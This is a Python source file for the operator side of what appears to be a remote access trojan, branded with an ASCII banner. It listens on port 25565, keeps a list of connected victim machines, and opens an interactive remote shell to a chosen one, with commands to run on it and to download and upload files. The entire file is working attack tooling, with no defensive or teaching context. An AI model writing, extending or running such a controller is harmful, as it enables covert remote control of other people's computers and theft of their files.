import socket
import os
from colorama import Fore, Style, init

# Initialize Colorama for colored output
init(autoreset=True)

clients = {}

def logo():
    start_color = (5, 13, 250)
    end_color = (0, 162, 255)
    art = r"""
 ▄███████▄  ▄█      ███        ▄████████    ▄████████    ▄████████          ▄████████    ▄████████     ███      
  ███    ███ ███  ▀█████████▄   ███    ███   ███    ███   ███    ███        ███    ███   ███    ███  ▀█████████▄ 
  ███    ███ ███▌    ▀███▀▀██   ███    █▀    ███    ███   ███    █▀         ███    ███   ███    ███     ▀███▀▀██ 
  ███    ███ ███▌     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀   ███              ▄███▄▄▄▄██▀   ███    ███      ███   ▀ 
▀█████████▀  ███▌     ███     ▀▀███▀▀▀      ▀▀███▀▀▀▀▀   ▀███████████     ▀▀███▀▀▀▀▀   ▀███████████      ███     
  ███         ███      ███       ███    █▄  ▀███████████           ███     ▀███████████   ███    ███      ███     
  ███         ███      ███       ███    ███   ███    ███   ▄█    ███        ███    ███   ███    ███      ███     
 ▄████▀       █▀      ▄████▀     ██████████   ███    ███ ▄████████▀          ███    ███   ███    █▀      ▄████▀   
    """
    lines = [line for line in art.splitlines() if line.strip()]
    for i, line in enumerate(lines):
        f = i / (len(lines) - 1) if len(lines) > 1 else 0
        r = int(start_color[0] + (end_color[0] - start_color[0]) * f)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * f)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * f)
        print(f"\033[38;2;{r};{g};{b}m{line}\033[0m")

def start_server(host="0.0.0.0", port=25565):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(5)
        server.settimeout(1)
        os.system("cls" if os.name == "nt" else "clear")
        logo()
        print(f"{Fore.CYAN}[*] Server listening on {host}:{port}")
        return server
    except Exception as e:
        print(f"{Fore.RED}[!] Could not start server: {e}")
        return None

if __name__ == "__main__":
    server = start_server()
    if server is None: exit()

    while True:
        try:
            # --- IMPROVED CONNECTION HANDLING ---
            try:
                conn, addr = server.accept()
                
                # Check if this IP is already connected and remove old session
                ip_only = addr[0]
                for old_addr in list(clients.keys()):
                    if old_addr[0] == ip_only:
                        try:
                            clients[old_addr].close()
                        except: pass
                        del clients[old_addr]
                        print(f"{Fore.YELLOW}[*] Replaced old session for {ip_only}")
                
                clients[addr] = conn
                print(f"\n{Fore.GREEN}[+] New connection from {addr[0]}")
            except socket.timeout:
                pass

            if not clients:
                continue

            # Display active clients
            print(f"\n{Fore.LIGHTBLACK_EX}--- Connected Clients ---")
            client_list = list(clients.keys())
            for idx, addr in enumerate(client_list, start=1):
                print(f"{Fore.CYAN}{idx}. {addr[0]}")

            # Select a client
            choice = input(f"\n{Fore.YELLOW}Select client (r to refresh) > {Fore.RESET}")
            if choice.lower() == 'r': continue
            if not choice.isdigit(): continue
            
            idx = int(choice) - 1
            if idx < 0 or idx >= len(client_list):
                print(f"{Fore.RED}[!] Invalid index!")
                continue

            target_addr = client_list[idx]
            sock = clients[target_addr]
            
            # --- SESSION LOOP ---
            print(f"{Fore.GREEN}[*] Session started with {target_addr[0]}. Type 'exit' to return.")
            
            while True:
                command = input(f"{Fore.RED}Shell@{target_addr[0]} > {Fore.RESET}")
                if not command: continue
                if command.lower() == "exit": break

                if command.startswith("download "):
                    sock.send(command.encode())
                    header = sock.recv(1024).decode(errors='ignore')
                    if header.startswith("SIZE:"):
                        size = int(header.split(":")[1])
                        fname = "dl_" + os.path.basename(command.split(" ", 1)[1])
                        print(f"[*] Downloading: {fname}...")
                        with open(fname, "wb") as f:
                            curr = 0
                            while curr < size:
                                chunk = sock.recv(min(8192, size - curr))
                                if not chunk: break
                                f.write(chunk)
                                curr += len(chunk)
                        print(f"{Fore.GREEN}[+] Success: {fname} saved.")
                    else:
                        print(f"{Fore.RED}[!] Error: {header}")
                    continue

                elif command.startswith("upload "):
                    fname = command.split(" ", 1)[1]
                    if os.path.exists(fname):
                        size = os.path.getsize(fname)
                        sock.send(f"upload|{fname}|{size}".encode())
                        with open(fname, "rb") as f:
                            sock.sendall(f.read())
                        print(sock.recv(1024).decode(errors='ignore'))
                    else:
                        print(f"{Fore.RED}[!] Local file not found.")
                    continue

                else:
                    sock.send(command.encode())
                    response = sock.recv(32768).decode('cp1250', errors='ignore')
                    print(f"\n{Fore.WHITE}{response}")

        except (ValueError, IndexError):
            print(f"{Fore.RED}[!] Invalid selection!")
        except (ConnectionResetError, BrokenPipeError, socket.error):
            print(f"{Fore.RED}[!] Connection lost.")
            if 'target_addr' in locals() and target_addr in clients:
                del clients[target_addr]
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Server shutting down...")
            break
